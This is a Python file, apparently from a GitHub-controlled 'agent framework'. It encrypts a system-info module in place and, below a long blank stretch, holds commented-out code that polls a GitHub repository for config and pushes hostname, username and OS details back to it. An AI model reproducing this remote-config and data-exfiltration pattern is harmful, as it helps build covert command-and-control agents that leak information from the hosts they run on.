from cryptography.fernet import Fernet

class Encryption:
    def __init__(self, key_path):
        with open(key_path, "rb") as file:
            key = file.read()
        self.fernet = Fernet(key)

    def encrypt_file(self, file_path):
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = self.fernet.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

    def decrypt_file(self, file_path):
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = self.fernet.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)

encryption = Encryption("key.txt")
encryption.encrypt_file("modules/system_info.py")




























# import git
# import os
# import json
# import time
# import shutil

# class GitHubConnector:
#     def __init__(self, repository_url):
#         self.repository_url = repository_url

#     def check_for_updates(self):
#         try:
#             local_directory = "temp_directory"
#             repo = git.Repo.clone_from(self.repository_url, local_directory)
#             response = None
#             config_file_path = os.path.join(local_directory, "config.txt")
#             if os.path.exists(config_file_path):
#                 with open(config_file_path, "r") as file:
#                     response = file.read()
#                     print(response)

#             repo.close()
#             shutil.rmtree(local_directory)

#             if response:
#                 return True
#             else:
#                 return False
#         except (git.exc.GitCommandError, FileNotFoundError):
#             print("error")
#             return False


#     def log_data(self):
#         # try:
#         data = {'operating_system': 'Linux', 'release': '4.18.0-477.10.1.el8_8.x86_64', 'version': '#1 SMP Tue May 16 11:38:37 UTC 2023', 'architecture': 'x86_64', 'processor': 'x86_64', 'hostname': 'rockylinux', 'username': 'rockylinux', 'python_version': '3.9.16'}
#         local_directory = "temp_directory"
#         if not os.path.exists(local_directory):
#             os.makedirs(local_directory)

#         repo = git.Repo.clone_from(self.repository_url, local_directory)

#         # Print the contents of the temporary directory
#         print("Contents of temp_directory:", os.listdir(local_directory))

#         log_file_path = os.path.join(local_directory, "log.txt")
#         log_file_path = os.path.abspath(log_file_path) 
#         print("log_file_path:", log_file_path)

#         # Verify the existence of the log file
#         print("log.txt exists:", os.path.exists(log_file_path))

#         log_file_path = os.path.join(local_directory, "log.txt")
#         print(log_file_path)
#         with open(log_file_path, "a") as file:
#             file.write(str(data) + "\n")
#         repo.git.add(all=True)
#         repo.index.commit("Add new log entry")
#         origin = repo.remote("origin")
#         origin.push()

#         repo.close()
#         shutil.rmtree(local_directory)

#         #     return True
#         # except (git.exc.GitCommandError, FileNotFoundError):
#         #     return False


# connector = GitHubConnector("https://github.com/ErniedM/agent-framework2")
# print(connector.log_data())